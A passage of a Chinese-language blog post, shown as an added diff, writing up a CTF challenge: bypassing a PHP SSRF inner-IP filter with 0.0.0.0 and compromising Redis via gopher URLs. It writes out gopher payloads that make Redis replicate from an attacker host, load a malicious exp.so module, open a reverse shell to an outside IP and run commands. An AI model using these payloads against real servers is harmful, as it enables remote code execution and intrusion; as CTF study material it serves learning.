+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nx">ip2long</span><span class="p">(</span><span class="s1">&#39;127.0.0.0&#39;</span><span class="p">)</span><span class="o">&gt;&gt;</span><span class="mi">24</span> <span class="o">==</span> <span class="nv">$int_ip</span><span class="o">&gt;&gt;</span><span class="mi">24</span> <span class="o">||</span> <span class="nx">ip2long</span><span class="p">(</span><span class="s1">&#39;10.0.0.0&#39;</span><span class="p">)</span><span class="o">&gt;&gt;</span><span class="mi">24</span> <span class="o">==</span> <span class="nv">$int_ip</span><span class="o">&gt;&gt;</span><span class="mi">24</span> <span class="o">||</span> <span class="nx">ip2long</span><span class="p">(</span><span class="s1">&#39;172.16.0.0&#39;</span><span class="p">)</span><span class="o">&gt;&gt;</span><span class="mi">20</span> <span class="o">==</span> <span class="nv">$int_ip</span><span class="o">&gt;&gt;</span><span class="mi">20</span> <span class="o">||</span> <span class="nx">ip2long</span><span class="p">(</span><span class="s1">&#39;192.168.0.0&#39;</span><span class="p">)</span><span class="o">&gt;&gt;</span><span class="mi">16</span> <span class="o">==</span> <span class="nv">$int_ip</span><span class="o">&gt;&gt;</span><span class="mi">16</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">function</span> <span class="nf">safe_request_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">check_inner_ip</span><span class="p">(</span><span class="nv">$url</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="nv">$url</span><span class="o">.</span><span class="s1">&#39; is inner ip&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$ch</span> <span class="o">=</span> <span class="nx">curl_init</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_URL</span><span class="p">,</span> <span class="nv">$url</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_RETURNTRANSFER</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">curl_setopt</span><span class="p">(</span><span class="nv">$ch</span><span class="p">,</span> <span class="nx">CURLOPT_HEADER</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$output</span> <span class="o">=</span> <span class="nx">curl_exec</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$result_info</span> <span class="o">=</span> <span class="nx">curl_getinfo</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$result_info</span><span class="p">[</span><span class="s1">&#39;redirect_url&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">safe_request_url</span><span class="p">(</span><span class="nv">$result_info</span><span class="p">[</span><span class="s1">&#39;redirect_url&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">curl_close</span><span class="p">(</span><span class="nv">$ch</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">var_dump</span><span class="p">(</span><span class="nv">$output</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$url</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$url</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">safe_request_url</span><span class="p">(</span><span class="nv">$url</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// Please visit hint.php locally.
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></div></div><p>代码审计，函数check_inner_ip的作用过滤掉了127.0.0.1等本地ip，然后利用</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$result_info</span><span class="p">[</span><span class="s1">&#39;redirect_url&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">safe_request_url</span><span class="p">(</span><span class="nv">$result_info</span><span class="p">[</span><span class="s1">&#39;redirect_url&#39;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span></span></span></code></pre></div></div><p>过滤了dns跳转的绕过方法，可以用dns重绑定，然后0.0.0.0也可以绕过（0.0.0.0 代表本机 ipv4 的所有地址）。</p>
+<p>绕过后可以拿到hint</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://pic.imgdb.cn/item/65ec43749f345e8d03824f4c.jpg"
+        data-srcset="https://pic.imgdb.cn/item/65ec43749f345e8d03824f4c.jpg, https://pic.imgdb.cn/item/65ec43749f345e8d03824f4c.jpg 1.5x, https://pic.imgdb.cn/item/65ec43749f345e8d03824f4c.jpg 2x"
+        data-sizes="auto"
+        alt="https://pic.imgdb.cn/item/65ec43749f345e8d03824f4c.jpg"
+        title="https://pic.imgdb.cn/item/65ec43749f345e8d03824f4c.jpg" /></p>
+<p>看到file_put_contents后面内容可能会想到死亡绕过，但这里不是，没有写入权限。告诉了redis数据库密码，是redis数据库的攻击，</p>
+<p><strong>redis常见的getshell有这么几种：</strong></p>
+<ol>
+<li>直接写webshell ，将shell写在web目录下</li>
+<li>写ssh公钥</li>
+<li>写crontab反弹shell，利用定时任务进行反弹shell</li>
+<li>主从复制进行getshell</li>
+</ol>
+<p>这里第一中中没写入权限不行，然后这里没有ssh和crontab，所以只能用第三种，redis主从复制。</p>
+<p>看师傅们的wp，准备好两个工具</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://github.com/xmsec/redis-ssrf
+</span></span><span class="line"><span class="cl">https://github.com/n0b0dyCN/redis-rogue-server</span></span></code></pre></div></div><p>先是试了自己的kali虚拟机和服务器都没收到回显，看wp还可以用buu本地机试试。</p>
+<p>启动buu本地的linux靶机，通过sftp把文件传输到靶机，在通过ssh连接上靶机，如下</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://pic.imgdb.cn/item/65ec43be9f345e8d03835b81.jpg"
+        data-srcset="https://pic.imgdb.cn/item/65ec43be9f345e8d03835b81.jpg, https://pic.imgdb.cn/item/65ec43be9f345e8d03835b81.jpg 1.5x, https://pic.imgdb.cn/item/65ec43be9f345e8d03835b81.jpg 2x"
+        data-sizes="auto"
+        alt="https://pic.imgdb.cn/item/65ec43be9f345e8d03835b81.jpg"
+        title="https://pic.imgdb.cn/item/65ec43be9f345e8d03835b81.jpg" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://pic.imgdb.cn/item/65ec43989f345e8d0382c671.jpg"
+        data-srcset="https://pic.imgdb.cn/item/65ec43989f345e8d0382c671.jpg, https://pic.imgdb.cn/item/65ec43989f345e8d0382c671.jpg 1.5x, https://pic.imgdb.cn/item/65ec43989f345e8d0382c671.jpg 2x"
+        data-sizes="auto"
+        alt="https://pic.imgdb.cn/item/65ec43989f345e8d0382c671.jpg"
+        title="https://pic.imgdb.cn/item/65ec43989f345e8d0382c671.jpg" /></p>
+<p>然后命令</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python rogue-server.py   //开始监听</span></span></code></pre></div></div><p>但是看有些师傅的wp还要构造payload，有些师傅直接就主从连上了，</p>
+<p>url命令</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">gopher</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0</span><span class="o">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">6379</span><span class="o">/</span><span class="n">_auth</span><span class="o">%</span><span class="mi">2520</span><span class="n">root</span><span class="o">%</span><span class="mi">250</span><span class="n">d</span><span class="o">%</span><span class="mi">250</span><span class="n">aconfig</span><span class="o">%</span><span class="mi">2520</span><span class="n">set</span><span class="o">%</span><span class="mi">2520</span><span class="n">dir</span><span class="o">%</span><span class="mi">2520</span><span class="o">/</span><span class="n">tmp</span><span class="o">/%</span><span class="mi">250</span><span class="n">d</span><span class="o">%</span><span class="mi">250</span><span class="n">aquit</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">gopher</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0</span><span class="o">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">6379</span><span class="o">/</span><span class="n">_auth</span><span class="o">%</span><span class="mi">2520</span><span class="n">root</span><span class="o">%</span><span class="mi">250</span><span class="n">d</span><span class="o">%</span><span class="mi">250</span><span class="n">aconfig</span><span class="o">%</span><span class="mi">2520</span><span class="n">set</span><span class="o">%</span><span class="mi">2520</span><span class="n">dbfilename</span><span class="o">%</span><span class="mi">2520</span><span class="nb">exp</span><span class="o">.</span><span class="n">so</span><span class="o">%</span><span class="mi">250</span><span class="n">d</span><span class="o">%</span><span class="mi">250</span><span class="n">aslaveof</span><span class="o">%</span><span class="mf">252042.193</span><span class="o">.</span><span class="mf">22.50</span><span class="o">%</span><span class="mi">25206666</span><span class="o">%</span><span class="mi">250</span><span class="n">d</span><span class="o">%</span><span class="mi">250</span><span class="n">aquit</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">gopher</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0</span><span class="o">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">6379</span><span class="o">/</span><span class="n">_auth</span><span class="o">%</span><span class="mi">2520</span><span class="n">root</span><span class="o">%</span><span class="mi">250</span><span class="n">d</span><span class="o">%</span><span class="mi">250</span><span class="n">amodule</span><span class="o">%</span><span class="mi">2520</span><span class="nb">load</span><span class="o">%</span><span class="mi">2520</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="nb">exp</span><span class="o">.</span><span class="n">so</span><span class="o">%</span><span class="mi">250</span><span class="n">d</span><span class="o">%</span><span class="mi">250</span><span class="n">asystem</span><span class="o">.</span><span class="n">rev</span><span class="o">%</span><span class="mf">252042.193</span><span class="o">.</span><span class="mf">22.50</span><span class="o">%</span><span class="mi">25206663</span><span class="o">%</span><span class="mi">250</span><span class="n">d</span><span class="o">%</span><span class="mi">250</span><span class="n">aquit</span></span></span></code></pre></div></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://pic.imgdb.cn/item/65ec43d89f345e8d0383c1a1.jpg"
+        data-srcset="https://pic.imgdb.cn/item/65ec43d89f345e8d0383c1a1.jpg, https://pic.imgdb.cn/item/65ec43d89f345e8d0383c1a1.jpg 1.5x, https://pic.imgdb.cn/item/65ec43d89f345e8d0383c1a1.jpg 2x"
+        data-sizes="auto"
+        alt="https://pic.imgdb.cn/item/65ec43d89f345e8d0383c1a1.jpg"
+        title="https://pic.imgdb.cn/item/65ec43d89f345e8d0383c1a1.jpg" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://pic.imgdb.cn/item/65ec52f19f345e8d03bb7206.jpg"
+        data-srcset="https://pic.imgdb.cn/item/65ec52f19f345e8d03bb7206.jpg, https://pic.imgdb.cn/item/65ec52f19f345e8d03bb7206.jpg 1.5x, https://pic.imgdb.cn/item/65ec52f19f345e8d03bb7206.jpg 2x"
+        data-sizes="auto"
+        alt="https://pic.imgdb.cn/item/65ec52f19f345e8d03bb7206.jpg"
+        title="https://pic.imgdb.cn/item/65ec52f19f345e8d03bb7206.jpg" /></p>
+<p>但监听没有收到任何连接，以为这道题要烂尾了。</p>
+<p>后面周师傅告诉我在NSSCTF上面有同样的题，换个靶场看看</p>
+<p>首先先给kali内网穿透</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://pic.imgdb.cn/item/65ec440c9f345e8d0384831e.jpg"
+        data-srcset="https://pic.imgdb.cn/item/65ec440c9f345e8d0384831e.jpg, https://pic.imgdb.cn/item/65ec440c9f345e8d0384831e.jpg 1.5x, https://pic.imgdb.cn/item/65ec440c9f345e8d0384831e.jpg 2x"
+        data-sizes="auto"
+        alt="https://pic.imgdb.cn/item/65ec440c9f345e8d0384831e.jpg"
+        title="https://pic.imgdb.cn/item/65ec440c9f345e8d0384831e.jpg" /></p>
+<p>然后下载好工具（不知道为什么工具不一样）</p>
+<p>参考：<a href="https://www.freebuf.com/articles/web/293030.html" target="_blank" rel="noopener noreffer ">很经典的一道CTF-WriteUP(网鼎杯 2020 玄武组)SSRFMe - FreeBuf网络安全行业门户</a></p>
+<p>参考：https://blog.csdn.net/m0_73512445/article/details/134740916</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">https://github.com/n0b0dyCN/redis-rogue-server
+</span></span><span class="line"><span class="cl"># redis-rogue-server，未授权使用
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">https://github.com/Testzero-wz/Awsome-Redis-Rogue-Server
+</span></span><span class="line"><span class="cl"># Awsome-Redis-Rogue-Server，有授权使用</span></span></code></pre></div></div><p>然后把redis-rogue-server的exp.so复制到Awsome-Redis-Rogue-Server文件中，开启监听（最开始监听的是9001，结果发现还是没回显，以为又是环境问题，结果是frp配置问题，好在当初多配了几个端口）</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python3 redis_rogue_server.py -v -path exp.so -lport 6666</span></span></code></pre></div></div><p>先传入</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gopher://0.0.0.0:6379/_auth%2520root%250d%250aconfig%2520set%2520dir%2520/tmp/%250d%250aquit
+</span></span><span class="line"><span class="cl">//设置备份文件路径，只有/tmp目录有权限
+</span></span><span class="line"><span class="cl">gopher://0.0.0.0:6379/_auth root
+</span></span><span class="line"><span class="cl">config set dir /tmp/
+</span></span><span class="line"><span class="cl">quit</span></span></code></pre></div></div><p>会和上面一样，回显三个OK</p>
+<p>然后在传入</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gopher://0.0.0.0:6379/_auth%2520root%250d%250aconfig%2520set%2520dbfilename%2520exp.so%250d%250aslaveof%2520ip%25209003%250d%250aquit
+</span></span><span class="line"><span class="cl">//设置了备份文件名，然后建立主从联系
+</span></span><span class="line"><span class="cl">gopher://0.0.0.0:6379/_auth root
+</span></span><span class="line"><span class="cl">config set dbfilename exp.so
+</span></span><span class="line"><span class="cl">slaveof 公网ip 9003
+</span></span><span class="line"><span class="cl">quit</span></span></code></pre></div></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://pic.imgdb.cn/item/65ec44309f345e8d038501e3.jpg"
+        data-srcset="https://pic.imgdb.cn/item/65ec44309f345e8d038501e3.jpg, https://pic.imgdb.cn/item/65ec44309f345e8d038501e3.jpg 1.5x, https://pic.imgdb.cn/item/65ec44309f345e8d038501e3.jpg 2x"
+        data-sizes="auto"
+        alt="https://pic.imgdb.cn/item/65ec44309f345e8d038501e3.jpg"
+        title="https://pic.imgdb.cn/item/65ec44309f345e8d038501e3.jpg" /></p>
+<p>kali主机得到回显，开始一直循环同步。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://pic.imgdb.cn/item/65ec44659f345e8d0385bd25.jpg"
+        data-srcset="https://pic.imgdb.cn/item/65ec44659f345e8d0385bd25.jpg, https://pic.imgdb.cn/item/65ec44659f345e8d0385bd25.jpg 1.5x, https://pic.imgdb.cn/item/65ec44659f345e8d0385bd25.jpg 2x"
+        data-sizes="auto"
+        alt="https://pic.imgdb.cn/item/65ec44659f345e8d0385bd25.jpg"
+        title="https://pic.imgdb.cn/item/65ec44659f345e8d0385bd25.jpg" /></p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">gopher</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0</span><span class="o">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">6379</span><span class="o">/</span><span class="n">_auth</span><span class="o">%</span><span class="mi">2520</span><span class="n">root</span><span class="o">%</span><span class="mi">250</span><span class="n">d</span><span class="o">%</span><span class="mi">250</span><span class="n">amodule</span><span class="o">%</span><span class="mi">2520</span><span class="nb">load</span><span class="o">%</span><span class="mf">2520.</span><span class="o">/</span><span class="nb">exp</span><span class="o">.</span><span class="n">so</span><span class="o">%</span><span class="mi">250</span><span class="n">d</span><span class="o">%</span><span class="mi">250</span><span class="n">aquit</span>
+</span></span><span class="line"><span class="cl"><span class="o">//</span><span class="err">把攻击模块加载到从机</span>
+</span></span><span class="line"><span class="cl"><span class="n">gopher</span><span class="p">:</span><span class="o">//</span><span class="mf">0.0</span><span class="o">.</span><span class="mf">0.0</span><span class="p">:</span><span class="mi">6379</span><span class="o">/</span><span class="n">_auth</span> <span class="n">root</span>
+</span></span><span class="line"><span class="cl"><span class="n">module</span> <span class="nb">load</span> <span class="o">./</span><span class="nb">exp</span><span class="o">.</span><span class="n">so</span>
+</span></span><span class="line"><span class="cl"><span class="n">quit</span></span></span></code></pre></div></div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://pic.imgdb.cn/item/65ec44479f345e8d03855723.jpg"
+        data-srcset="https://pic.imgdb.cn/item/65ec44479f345e8d03855723.jpg, https://pic.imgdb.cn/item/65ec44479f345e8d03855723.jpg 1.5x, https://pic.imgdb.cn/item/65ec44479f345e8d03855723.jpg 2x"
+        data-sizes="auto"
+        alt="https://pic.imgdb.cn/item/65ec44479f345e8d03855723.jpg"
+        title="https://pic.imgdb.cn/item/65ec44479f345e8d03855723.jpg" /></p>
+<p>传入</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gopher://0.0.0.0:6379/_auth%2520root%250d%250aslaveof%2520NO%2520ONE%250d%250aquit
+</span></span><span class="line"><span class="cl">//断开主从同步
+</span></span><span class="line"><span class="cl">gopher://0.0.0.0:6379/_auth root
+</span></span><span class="line"><span class="cl">slaveof NO ONE
+</span></span><span class="line"><span class="cl">quit</span></span></code></pre></div></div><p>主机：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://pic.imgdb.cn/item/65ec44ba9f345e8d0386c1b7.jpg"
+        data-srcset="https://pic.imgdb.cn/item/65ec44ba9f345e8d0386c1b7.jpg, https://pic.imgdb.cn/item/65ec44ba9f345e8d0386c1b7.jpg 1.5x, https://pic.imgdb.cn/item/65ec44ba9f345e8d0386c1b7.jpg 2x"
+        data-sizes="auto"
+        alt="https://pic.imgdb.cn/item/65ec44ba9f345e8d0386c1b7.jpg"
+        title="https://pic.imgdb.cn/item/65ec44ba9f345e8d0386c1b7.jpg" />
+导入了模块就可以执行命令了</p>
+<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
+    <div class="code-header language-bash">
+        <span class="code-title"><i class="arrow fas fa-chevron-right fa-fw" aria-hidden="true"></i></span>
+        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
+        <span class="copy" title="复制到剪贴板"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
+    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">gopher://0.0.0.0:6379/_auth%2520root%250d%250asystem.exec%2520%2522cat%2520%252Fflag%2522%250d%250aquit
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">gopher://0.0.0.0:6379/_auth root
+</span></span><span class="line"><span class="cl">system.exec &#34;cat /flag&#34;
+</span></span><span class="line"><span class="cl">quit</span></span></code></pre></div></div><p>得到flag</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://pic.imgdb.cn/item/65ec44cf9f345e8d03870a3e.jpg"
+        data-srcset="https://pic.imgdb.cn/item/65ec44cf9f345e8d03870a3e.jpg, https://pic.imgdb.cn/item/65ec44cf9f345e8d03870a3e.jpg 1.5x, https://pic.imgdb.cn/item/65ec44cf9f345e8d03870a3e.jpg 2x"
+        data-sizes="auto"
+        alt="https://pic.imgdb.cn/item/65ec44cf9f345e8d03870a3e.jpg"
+        title="https://pic.imgdb.cn/item/65ec44cf9f345e8d03870a3e.jpg" /></p>
+<p>至于为什么上面显示连接来自于127.0.0.1，其实是因为frp的原因，可以看看云服务器上</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://pic.imgdb.cn/item/65ec44e89f345e8d0387593c.jpg"
+        data-srcset="https://pic.imgdb.cn/item/65ec44e89f345e8d0387593c.jpg, https://pic.imgdb.cn/item/65ec44e89f345e8d0387593c.jpg 1.5x, https://pic.imgdb.cn/item/65ec44e89f345e8d0387593c.jpg 2x"
+        data-sizes="auto"
+        alt="https://pic.imgdb.cn/item/65ec44e89f345e8d0387593c.jpg"
+        title="https://pic.imgdb.cn/item/65ec44e89f345e8d0387593c.jpg" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://pic.imgdb.cn/item/65ec45079f345e8d0387b6a6.jpg"
+        data-srcset="https://pic.imgdb.cn/item/65ec45079f345e8d0387b6a6.jpg, https://pic.imgdb.cn/item/65ec45079f345e8d0387b6a6.jpg 1.5x, https://pic.imgdb.cn/item/65ec45079f345e8d0387b6a6.jpg 2x"
+        data-sizes="auto"
+        alt="https://pic.imgdb.cn/item/65ec45079f345e8d0387b6a6.jpg"
+        title="https://pic.imgdb.cn/item/65ec45079f345e8d0387b6a6.jpg" /></p>
+<p>意思是连接时由云服务器转过来的，所以显示127.0.0.1</p>
+<p>这道题还可以反弹shell，我就不复现了。</p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2024-03-09</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="http://localhost:1313/posts/rdis/" data-title="redis数据库主从复制" data-hashtags="redis"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://localhost:1313/posts/rdis/" data-hashtag="redis"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/redis/">Redis</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/aliyunctf/" class="prev" rel="prev" title="AliyunCTF 2025 部分wp"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>AliyunCTF 2025 部分wp</a>
+            <a href="/posts/nodejs-vm/" class="next" rel="next" title="nodejs VM和VM2沙箱逃逸">nodejs VM和VM2沙箱逃逸<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.140.1">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.3.0"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
